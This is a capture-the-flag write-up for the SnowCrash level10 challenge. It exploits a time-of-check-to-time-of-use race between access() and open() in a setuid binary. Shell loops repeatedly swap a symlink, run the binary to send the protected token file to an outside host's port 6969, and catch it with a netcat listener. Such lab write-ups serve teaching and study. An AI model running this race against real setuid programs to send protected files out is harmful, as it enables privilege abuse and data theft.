```bash
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
level10@SnowCrash:~$ cat token
cat: token: Permission denied
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
```
Let's try: 
```bash
level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
```
Let's do a symlink on token to see if it failed because of `token` in the file name:

```bash
level10@SnowCrash:~$ ln -s /home/user/level10/token /tmp/final
level10@SnowCrash:~$ ./level10 /tmp/final localhost
You don't have access to /tmp/final
```
`Level10` seems to check a user's rights, instead of a `strstr`on the name of file.</br>
Let's analyze a bit `level10`:

```bash
level10@SnowCrash:~$ strings level10
open
access
[...]
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 ..
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file ..
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
[...]
```

`level10` does an access() then an open(). This is a security hole. 

`Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.`
https://linux.die.net/man/2/access

`level10` seems to send a file to a host on its port 6969, once it is sent, it opens it, reads it, and write it.

We don't have permission to `cat token`, so maybe we can send token with `level10` program on a host, listen to the host's `6969` port and read the token once `level10` write it.

How do we do we listen to a port?

`If you want to create a simple "test" server that can be set listen on a specified port and that you can interact with, take a look at the netcat command`
https://askubuntu.com/questions/301787/opening-a-port-for-listening

` [netcat] can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6.`
`nc -l      Listen for an incoming connection rather than initiating a connection to a remote
             host.  The destination and port to listen on can be specified either as non-optional
             arguments, or with options -s and -p respectively.`

Theorical steps:
- Do a symlink again and again (in a loop)
- launch `level10` in a loop
- Hope that level10 will accept our file with access
- Then the symlink will occure
- Then level10 will open our modified file and write it on port 6969
- listen to the port to see what is happening and maybe catch the token

# Solution

Level10 seems to be able to sends any file we create so on a first terminal connected with ssh let's create the file that is going to be the symlink (`readlink -f token` to know the true path of token file):
```bash
while true; do rm -rf /tmp/final; touch /tmp/final; ln -sfn /home/user/level10/token /tmp/final; done
```
We need to suppress and create a new file each time or the symlink will apply on `tmp/final` and will not pass the `access()` check again.

- On a second ssh terminal let's execute level10 in a loop: 
```bash 
while true; do (./level10 /tmp/final 10.11.200.134); done
```

- On a third terminal, we can listen to the port 6969 with the netcat command: 
```bash
while true; do nc -l 6969 ;done
```
